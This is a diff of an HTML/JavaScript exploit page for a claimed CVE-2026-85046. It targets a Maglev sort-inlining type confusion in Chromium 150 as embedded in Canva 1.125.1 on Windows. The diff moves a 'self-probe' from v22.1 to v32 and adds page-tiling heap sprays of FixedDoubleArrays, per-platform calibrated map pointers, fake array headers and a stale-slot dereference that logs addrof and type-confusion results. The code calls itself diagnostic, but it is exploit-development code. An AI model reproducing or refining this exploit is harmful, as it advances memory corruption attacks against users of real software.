@@ -1,7 +1,7 @@
 <!doctype html>
 <html>
   <head>
-    <title>CVE-2026-85046 - Canva Windows embed self-probe phase A/B v22.1</title>
+    <title>CVE-2026-85046 - Canva Windows page-tiling self-probe v32</title>
     <meta charset="UTF-8" />
     <style>
       * {
@@ -83,7 +83,7 @@
   </head>
   <body>
     <h1>
-      CVE-2026-85046 &mdash; Canva Windows Embed Self-Probe v22.1
+      CVE-2026-85046 &mdash; Canva Windows Page-Tiling Self-Probe v32
     </h1>
     <p class="dim">
       Bug: Array.prototype.sort inlining &mdash; Maglev
@@ -104,11 +104,11 @@
       Map constants below are calibrated from a <b>Canva 1.125.1 / Chromium 150.0.7871.114 Windows x64</b> crash dump.
     </div>
 
-    <button id="btn" onclick="handleClick()">[ RUN V22 FORENSIC ]</button>
+    <button id="btn" onclick="handleClick()">[ RUN V32 PAGE-TILING PROBE ]</button>
 
     <div id="output"></div>
     <hr />
-    <p class="dim">Diagnostic chain (v22.1 performs one persisted stale-slot self-probe per fresh renderer):</p>
+    <p class="dim">Diagnostic chain (v32 performs one persisted page-tiling stale-slot self-probe per fresh renderer):</p>
     <ol class="dim">
       <li>Train Maglev with mixed element kinds ({PACKED_SMI, PACKED})</li>
       <li>
@@ -125,8 +125,11 @@
         old&rarr;young edge &rarr; phase-specific spray with stage canaries
       </li>
       <li>
-        <b>v22.1 stop point</b> &mdash; one phase, one 8-batch spray, then one controlled
-        <code>bad[2]</code> validation. Attempt metadata is persisted before dereference
+        <b>v32 stop point</b> &mdash; one phase, one 32-page-batch spray (about 8 MiB), then one controlled
+        <code>bad[2]</code> validation. Each batch uses eight alternating
+        <code>0x1000</code>/<code>0xffc</code> FixedDoubleArray lengths so the backing
+        stores cover both halves of a 0x40000-byte V8 page. Attempt metadata is
+        persisted before dereference
       </li>
     </ol>
     <p class="dim">References:</p>
@@ -157,8 +160,9 @@
 
     <script>
       // ============================================================================
-      // CVE-2026-85046 — v22.1 Embed self-probe diagnostic
-      // Target: Chromium 150.0.7871.181 (Debian, Linux x64)
+      // CVE-2026-85046 — v32 page-tiling Embed self-probe diagnostic
+      // Product target: Canva 1.125.1 / Chromium 150.0.7871.114 Windows x64.
+      // Local control: stock Electron 43.1.1 Linux x64.
       //   V8 cage base is 4GB-aligned => compressed offsets are per-build constants.
       //   Calibrated via gdb (x/4wx on %DebugPrint'd probe arrays):
       //     PACKED_DOUBLE_ELEMENTS JSArray map = 0x01032a81  // Canva Win 1.125.1 dump-calibrated
@@ -176,32 +180,35 @@
       var running = false;
 
       var V22_PHASES = [0, 4];
-      var V22_STAGE_BATCHES = 8;
+      var V32_STAGE_BATCHES = 32;
       var V22_CANARY_STRIDE = 16;
+      var V32_ARRAYS_PER_PAGE_BATCH = 8;
+      var V32_TILE_LENGTH_A = 0x1000;
+      var V32_TILE_LENGTH_B = 0x0ffc;
 
-      // v22.1: Embed-only self-probe. Each fresh renderer runs exactly one test.
+      // v32: Embed-only self-probe. Each fresh renderer runs exactly one test.
       // Advance/persist BEFORE bad[2] so a renderer crash is itself diagnostic.
       var V221_TESTS = [
-        { phase: 0, batches: 8, marker: 30 },
-        { phase: 4, batches: 8, marker: 32 },
+        { phase: 0, batches: V32_STAGE_BATCHES, marker: 30 },
+        { phase: 4, batches: V32_STAGE_BATCHES, marker: 32 },
       ];
 
       function getV221TestIndex() {
         var raw = null;
-        try { raw = localStorage.getItem("f022-v221-test-index"); } catch (_) {}
+        try { raw = localStorage.getItem("f022-v32-test-index"); } catch (_) {}
         var idx = Number(raw);
         if (!Number.isInteger(idx) || idx < 0) idx = 0;
         return idx;
       }
 
       function setV221TestIndex(idx) {
-        try { localStorage.setItem("f022-v221-test-index", String(idx)); } catch (_) {}
+        try { localStorage.setItem("f022-v32-test-index", String(idx)); } catch (_) {}
       }
 
       function resetV221SelfProbe() {
         setV221TestIndex(0);
-        try { localStorage.removeItem("f022-v221-last"); } catch (_) {}
-        log("[v22.1] self-probe reset; next fresh renderer will test forced phase 0");
+        try { localStorage.removeItem("f022-v32-last"); } catch (_) {}
+        log("[v32] self-probe reset; next fresh renderer will test forced phase 0");
       }
 
       window.resetV221SelfProbe = resetV221SelfProbe;
@@ -246,10 +253,10 @@
       }
 
       try {
-        var previous221 = localStorage.getItem("f022-v221-last");
+        var previous221 = localStorage.getItem("f022-v32-last");
         if (previous221) {
           setTimeout(function () {
-            log("[previous v22.1 attempt] " + previous221);
+            log("[previous v32 attempt] " + previous221);
           }, 10);
         }
 
@@ -258,11 +265,11 @@
           if (testIdxPreview < V221_TESTS.length) {
             var t = V221_TESTS[testIdxPreview];
             log(
-              "[v22.1] next fresh-renderer self-probe: forced phase " +
+              "[v32] next fresh-renderer self-probe: forced phase " +
                 t.phase + ", " + t.batches + " batch(es), marker=" + t.marker,
             );
           } else {
-            log("[v22.1] phase A/B self-probe complete. Call resetV221SelfProbe() to repeat.");
+            log("[v32] phase A/B self-probe complete. Call resetV221SelfProbe() to repeat.");
           }
         }, 15);
       } catch (_) {}
@@ -293,8 +300,13 @@
       // ---------------------------------------------------------------------------
       // Constants (calibrated for Chromium 150.0.7871.181)
       // ---------------------------------------------------------------------------
-      var PACKED_DOUBLE_MAP = 0x01032a81; // tagged compressed map ptr, PACKED_DOUBLE_ELEMENTS JSArray
-      var PACKED_ELEMENTS_MAP = 0x01032b09; // tagged compressed map ptr, PACKED_ELEMENTS JSArray
+      var IS_LINUX_STOCK = /Linux/.test(navigator.platform || "") &&
+        !/Windows NT/.test(navigator.userAgent || "");
+      var PACKED_DOUBLE_MAP = IS_LINUX_STOCK ? 0x01032a35 : 0x01032a81;
+      var PACKED_ELEMENTS_MAP = IS_LINUX_STOCK ? 0x01032abd : 0x01032b09;
+      var MAP_PROFILE = IS_LINUX_STOCK
+        ? "stock Electron 43.1.1 Linux x64"
+        : "Canva 1.125.1 Windows x64";
       var EMPTY_PROPERTIES = 0x000007e5; // empty_fixed_array (read-only space)
       var FAKE_LEN_SMI = 0x40; // fake master length field: raw Smi word = 32<<1
 
@@ -379,8 +391,11 @@
       }
 
       // ---------------------------------------------------------------------------
-      // v22 forensic spray. Keep v21's reference FixedDoubleArray geometry, but
-      // place one stage-specific 64-bit canary every V22_CANARY_STRIDE doubles.
+      // v32 page-tiling spray. Each batch retains eight FixedDoubleArrays whose
+      // lengths alternate 0x1000 and 0xffc. Their backing-store sizes are close
+      // to 0x8000 bytes and, as a group, cover an entire 0x40000-byte V8 page,
+      // including stale addresses whose page offset is above 0x20000.
+      // Place one stage-specific 64-bit canary every V22_CANARY_STRIDE doubles.
       // Only 1/16 doubles are changed; the remaining 93.75% retain the v21 fake
       // header repetition. The canary is diagnostic only and is never dereferenced.
       //
@@ -399,8 +414,9 @@
         fakeLenSmi,
         canaryDouble,
       ) {
-        for (var i = 0; i < 4; i++) {
-          var n = i & 1 ? 0x3ffb : 0x3fff;
+        var retainedTiles = new Array(V32_ARRAYS_PER_PAGE_BATCH);
+        for (var i = 0; i < V32_ARRAYS_PER_PAGE_BATCH; i++) {
+          var n = i & 1 ? V32_TILE_LENGTH_B : V32_TILE_LENGTH_A;
           var a;
 
           if (phase === 0) {
@@ -420,7 +436,9 @@
           for (var c = 7; c < a.length; c += V22_CANARY_STRIDE) {
             a[c] = canaryDouble;
           }
+          retainedTiles[i] = a;
         }
+        return retainedTiles;
       }
 
       function sprayForensicStage(
@@ -430,14 +448,16 @@
         fakeLenSmi,
         canaryDouble,
       ) {
+        var retainedPages = new Array(batches);
         for (var b = 0; b < batches; b++) {
-          sprayForensicBatch(
+          retainedPages[b] = sprayForensicBatch(
             victim_elems_tagged,
             phase,
             fakeLenSmi,
             canaryDouble,
           );
         }
+        return retainedPages;
       }
 
       function v22Pause(stage, dead_addr, phase, lo, hi) {
@@ -536,7 +556,10 @@
               originalPattern: original_pattern,
               forcedPhase: forcedPhase,
               stageBatches: stageBatches,
-              approxKiBPerStage: stageBatches * 512,
+              approxKiBPerStage: stageBatches * 256,
+              tileLengths: [V32_TILE_LENGTH_A, V32_TILE_LENGTH_B],
+              arraysPerPageBatch: V32_ARRAYS_PER_PAGE_BATCH,
+              targetV8PageBytes: 0x40000,
               canaryStrideDoubles: V22_CANARY_STRIDE,
               stage1Length: 30,
               stage2Length: 31,
@@ -555,7 +578,7 @@
             " batches=" + stageBatches +
             " canary=" + hex(V22_S1_CANARY_LO) + "/" + hex(V22_S1_CANARY_HI),
         );
-        sprayForensicStage(
+        var retainedStage1 = sprayForensicStage(
           victim_elems_tagged, forcedPhase, stageBatches, STAGE1_LEN_SMI, S1,
         );
         v22Pause(1, dead_addr, forcedPhase, V22_S1_CANARY_LO, V22_S1_CANARY_HI);
@@ -565,7 +588,7 @@
             " batches=" + stageBatches +
             " canary=" + hex(V22_S2_CANARY_LO) + "/" + hex(V22_S2_CANARY_HI),
         );
-        sprayForensicStage(
+        var retainedStage2 = sprayForensicStage(
           victim_elems_tagged, forcedPhase, stageBatches, STAGE2_LEN_SMI, S2,
         );
         v22Pause(2, dead_addr, forcedPhase, V22_S2_CANARY_LO, V22_S2_CANARY_HI);
@@ -575,7 +598,7 @@
             " batches=" + stageBatches +
             " canary=" + hex(V22_S3_CANARY_LO) + "/" + hex(V22_S3_CANARY_HI),
         );
-        sprayForensicStage(
+        var retainedStage3 = sprayForensicStage(
           victim_elems_tagged, forcedPhase, stageBatches, STAGE3_LEN_SMI, S3,
         );
         v22Pause(3, dead_addr, forcedPhase, V22_S3_CANARY_LO, V22_S3_CANARY_HI);
@@ -585,6 +608,9 @@
         // Drop fragile references before returning to allocation-heavy logging.
         bad = null;
         victim = null;
+        retainedStage1 = null;
+        retainedStage2 = null;
+        retainedStage3 = null;
 
         try {
           localStorage.setItem(
@@ -612,7 +638,8 @@
       }
 
       // ---------------------------------------------------------------------------
-      // v22.1 Embed self-probe: one phase + one spray + one stale-slot dereference.
+      // v32 Embed self-probe: one phase + one retained page-tiling spray + one
+      // stale-slot dereference.
       // If bad[2] crashes the renderer, the pre-deref record survives in localStorage
       // and the next fresh renderer advances to the other phase.
       // ---------------------------------------------------------------------------
@@ -656,7 +683,7 @@
             " batches=" + stageBatches,
         );
 
-        sprayForensicStage(
+        var retainedPageTiles = sprayForensicStage(
           victim_elems_tagged, forcedPhase, stageBatches, fakeLenSmi, canary,
         );
 
@@ -669,6 +696,13 @@
           dead_addr: hex(dead_addr),
           victim: hex(victim_base),
           originalPattern: original_pattern,
+          allocationGeometry: {
+            tileLengths: [V32_TILE_LENGTH_A, V32_TILE_LENGTH_B],
+            arraysPerPageBatch: V32_ARRAYS_PER_PAGE_BATCH,
+            pageBatches: stageBatches,
+            targetV8PageBytes: 0x40000,
+            approximateMiB: (stageBatches * 256) / 1024,
+          },
           staleRecheck: null,
           bad2DereferenceAttempted: true,
         };
@@ -679,7 +713,7 @@
           pre.staleRecheck = hex(staleAgain);
         } catch (_) {}
 
-        try { localStorage.setItem("f022-v221-last", JSON.stringify(pre)); } catch (_) {}
+        try { localStorage.setItem("f022-v32-last", JSON.stringify(pre)); } catch (_) {}
         dbg("      [7] state persisted; performing ONE bad[2] self-probe now...");
 
         // This is intentionally the only fragile object dereference in this run.
@@ -708,6 +742,7 @@
           dead_addr: hex(dead_addr),
           victim: hex(victim_base),
           originalPattern: original_pattern,
+          allocationGeometry: pre.allocationGeometry,
           staleRecheck: pre.staleRecheck,
           candidateType: candidateType,
           observedLength: observedLength,
@@ -718,12 +753,13 @@
           nativeCodeExecutionAttempted: false,
           sandboxEscapeAttempted: false,
         };
-        try { localStorage.setItem("f022-v221-last", JSON.stringify(post)); } catch (_) {}
+        try { localStorage.setItem("f022-v32-last", JSON.stringify(post)); } catch (_) {}
 
         // Drop fragile references immediately; no further fake-object operations.
         candidate = null;
         bad = null;
         victim = null;
+        retainedPageTiles = null;
         return post;
       }
 
@@ -786,9 +822,10 @@
         var vm = ua.match(/Chrom(?:e|ium)\/(\d+)\./);
         var majorVer = vm ? parseInt(vm[1]) : 0;
         log("Chromium major version: " + majorVer);
-        log("Canva/Windows maps: PACKED_DOUBLE=" + hex(PACKED_DOUBLE_MAP) +
+        log("Map profile: " + MAP_PROFILE);
+        log("Selected maps: PACKED_DOUBLE=" + hex(PACKED_DOUBLE_MAP) +
             " PACKED_ELEMENTS=" + hex(PACKED_ELEMENTS_MAP));
-        log("Map calibration: decoded from Canva 1.125.1 minidump (ElementsKind 4/2).");
+        log("Windows maps: decoded from Canva 1.125.1 minidump (ElementsKind 4/2).");
         if (majorVer >= 152) {
           log(
             "WARNING: version >= 152 is PATCHED (sort no longer inlined on mixed kinds).",
@@ -869,16 +906,16 @@
           );
         }
 
-        // ================= Step 3: v22.1 Embed self-probe phase A/B =================
+        // ================= Step 3: v32 page-tiling Embed self-probe phase A/B =================
         log("");
-        log("[*] Step 3: v22.1 Embed self-probe phase A/B...");
+        log("[*] Step 3: v32 page-tiling Embed self-probe phase A/B...");
 
         var testIndex = getV221TestIndex();
         if (testIndex >= V221_TESTS.length) {
-          log("[v22.1] self-probe complete: forced phase 0 and phase 4 were already scheduled.");
-          log("[v22.1] Call resetV221SelfProbe() if you want to repeat.");
+          log("[v32] self-probe complete: forced phase 0 and phase 4 were already scheduled.");
+          log("[v32] Call resetV221SelfProbe() if you want to repeat.");
           var completeOut = {
-            outcome: "v22.1-phase-ab-complete",
+            outcome: "v32-page-tiling-phase-ab-complete",
             typeConfusion: true,
             addrof: true,
             bad2DereferenceAttempted: false,
@@ -902,6 +939,8 @@
             ": FORCED phase=" + test.phase +
             ", " + test.batches + " batch(es), marker=" + test.marker,
         );
+        log("    Page tiling: 8 alternating 0x1000/0xffc arrays per page batch.");
+        log("    Retained spray: approximately " + ((test.batches * 256) / 1024) + " MiB.");
         log("    Embed-only mode: no DevTools/debugger/memory snapshot required.");
         log("    Exactly one bad[2] dereference will be attempted after the spray.");
         log("    Attempt state is persisted before dereference, so a renderer crash is recorded.");
@@ -910,8 +949,8 @@
           testIndex, test.phase, test.batches, test.marker,
         );
         out.outcome = out.markerLanded
-          ? "v22.1-marker-landed"
-          : "v22.1-returned-without-marker";
+          ? "v32-page-tiling-marker-landed"
+          : "v32-page-tiling-returned-without-marker";
 
         window.probeResult = out;
         document.getElementById("output").textContent +=
